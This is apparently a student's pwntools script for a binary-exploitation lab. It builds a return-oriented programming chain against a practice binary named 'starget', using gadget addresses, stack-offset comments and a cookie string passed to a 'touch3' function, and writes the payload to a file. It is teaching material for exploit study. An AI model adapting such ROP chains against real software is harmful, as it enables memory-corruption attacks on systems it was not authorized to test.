from pwn import *

e = ELF('/home/ubuntu/workspace/lab3/starget')
rop = ROP(e)

# 8 ret
# -0 old rbp
# -0x10 canary
# ?
# -0x20 0000 offset(0x1C - 0x20)
# buffer
# -0xA0
# dest
# -0x120 rsp 
ins1 = 0x40200d # mov %rsp %rax; ret # 0x401fac
ins2 = 0x401f5b # mov %rax %rdi; ret
ins4 = 0x40173c # pop rsi; ret
ins5 = 0x401fa2 # leaq (%rdi,%rsi),%rax;ret 0x401f9e
ins6 = 0x401f46 # ret
touch3 = e.symbols['touch3']

cookie_str = b"7f7639c5\0"
payload = (
            p64(ins1) +
            p64(ins2) +
            p64(ins4) + p64(-0x24, sign="signed") +
            p64(ins5) +
            p64(ins2) +
            p64(ins6) +
            p64(touch3) +
            b"A" * (0x44) +
            p32(0x120+8)
            + p32(0)
            + cookie_str
        )

print("len:", hex(len(payload)))

with open("payload4", "wb") as f:
    f.write(payload)